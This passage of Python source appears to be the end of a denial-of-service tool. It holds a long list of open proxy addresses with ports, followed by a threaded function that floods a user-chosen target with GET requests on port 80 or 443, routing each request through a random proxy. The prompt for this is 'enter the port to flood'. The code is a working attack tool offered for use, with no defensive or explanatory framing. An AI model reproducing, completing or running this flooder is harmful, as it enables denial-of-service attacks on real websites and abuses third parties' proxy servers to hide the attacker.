    "http://27.79.171.247:16000",
    "http://27.79.135.142:16000",
    "http://27.79.248.170:16000",
    "http://27.79.139.35:16000",
    "http://27.79.177.174:16000",
    "http://27.79.234.186:16000",
    "http://27.79.157.40:16000",
    "http://27.79.133.209:16000",
    "http://27.79.181.42:16000",
    "http://27.79.213.73:16000",
    "http://103.163.80.74:3125",
    "http://38.255.86.4:999",
    "http://103.94.10.180:8080",
    "http://103.178.41.19:8080",
    "http://27.79.134.113:16000",
    "http://177.72.13.132:6654",
    "http://27.79.239.15:16000",
    "http://117.20.62.232:8080",
    "http://27.79.156.232:16000",
    "http://27.79.240.105:16000",
    "http://89.163.145.22:25594",
    "http://154.73.28.49:8080",
    "http://103.178.41.19:1976",
    "http://103.165.156.148:8090",
    "http://111.132.16.172:3389",
    "http://58.120.36.166:9443",
    "http://103.112.144.42:8088",
    "http://36.68.28.149:8080",
    "http://123.136.93.179:1111",
    "http://42.113.4.88:10004",
    "http://42.113.4.174:10006",
    "http://42.113.4.119:10010",
    "http://42.113.4.163:10005",
    "http://42.113.4.111:10018",
    "http://42.113.4.111:10004",
    "http://103.162.55.42:8080",
    "http://42.113.4.174:10020",
    "http://42.113.4.255:10005",
    "http://42.113.4.163:10018",
    "http://42.113.4.186:10004",
    "http://42.113.4.186:10012",
    "http://42.113.4.233:10014",
    "http://42.113.4.186:10007",
    "http://103.125.16.58:8080",
    "http://112.78.39.252:8080",
    "http://111.132.17.34:3389",
    "http://103.118.175.18:8080",
    "http://111.132.16.182:3389",
    "http://194.28.224.123:8080",
    "http://181.78.82.211:999",
    "http://138.0.141.46:8080",
    "http://164.70.92.167:3128",
    "http://165.16.5.57:1976",
    "http://118.71.75.5:10001",
    "http://103.44.19.220:3127",
    "http://190.14.251.108:999",
    "http://191.102.250.103:8080",
    "http://117.54.114.100:80",
    "http://110.164.233.42:8080",
    "http://187.94.220.85:8080",
    "http://158.255.77.168:80",
    "http://103.82.233.2:53281",
    "http://58.120.36.156:3128",
    "http://157.20.233.163:3125",
    "http://176.124.199.114:3128",
    "http://202.51.106.229:8080",
    "http://103.155.65.71:8080",
    "http://45.188.164.3:999",
    "http://62.195.177.27:3128",
    "http://103.135.24.109:57413",
    "http://103.154.179.52:8080",
    "http://103.160.41.65:8080",
    "http://1.54.41.231:10009",
    "http://1.54.41.231:10008",
    "http://1.54.41.144:10002",
    "http://203.190.117.130:8077",
    "http://45.117.31.217:58080",
    "http://170.187.231.194:5430",
    "http://154.70.134.151:6969",
    "http://124.226.138.37:1080",
    "http://43.247.37.250:57413",
    "http://37.98.231.246:8080",
    "http://148.72.133.72:30109",
    "http://103.146.197.73:8080",
    "http://37.110.130.223:8081",
    "http://103.195.65.200:8080",
    "http://103.46.4.101:8080",
    "http://103.178.171.34:8080",
    "http://157.15.63.192:8080",
    "http://146.196.109.237:57413",
    "http://103.184.62.25:8099",
    "http://203.142.86.249:88",
    "http://157.66.16.33:8070",
    "http://103.54.80.193:1111",
    "http://139.84.208.78:3129",
    "http://66.54.106.56:8104",
    "http://185.159.153.234:80",
    "http://164.163.42.15:10000",
    "http://103.150.196.146:8080",
    "http://218.205.43.68:99",
    "http://188.125.169.82:8080",
    "http://177.93.59.71:999",
    "http://79.175.133.162:3128",
    "http://38.156.73.148:8080",
    "http://136.226.233.109:10742",
    "http://154.73.28.79:8080",
    "http://103.167.170.62:1111",
    "http://51.79.135.181:8080",
    "http://222.252.194.29:8080",
    "http://199.188.93.55:8000",
    "http://158.51.210.75:8888"
]



fail = []


def http_method():
    for i in range(x):
        time.sleep(0.1)
        targ1 = targ+":"+port

        global headers1

        if port == "80":
            proxy = random.choice(proxy_list)
        
            proxies = {
                'http': proxy,

            }

            try:
                response = requests.get("http://"+targ1, headers=headers1, proxies=proxies, timeout=30)
                print(f"Status Code 'GET': {response.status_code} | Proxy: {proxy} | TARGET : {targ1}")
            except requests.RequestException as e:
                return

        if port == "443":
            proxy = random.choice(proxy_list)
        
            proxies = {
                'https': proxy
            }

            
            try:
                response = requests.get("https://"+targ1, headers=headers1, proxies=proxies, timeout=30)
                print(f"Status Code 'GET': {response.status_code} | Proxy: {proxy} | TARGET : {targ1}")
            except requests.RequestException as e:
                return


if method == 4:
    port = str(input("enter the port to flood (80 or 443)"))
    for _ in range(threads): # Start x amount of threads

        t = threading.Thread(target=http_method, daemon=True) #sets the thread target to the function "http_method", daemon means we can exit the thread before its finished its done

        t.start() # starts the thread and function



#lets us stop whenever we want by pressing enter, thanks to the daemon threads
input("Press Enter to quit\n")
print(fail)
done = True



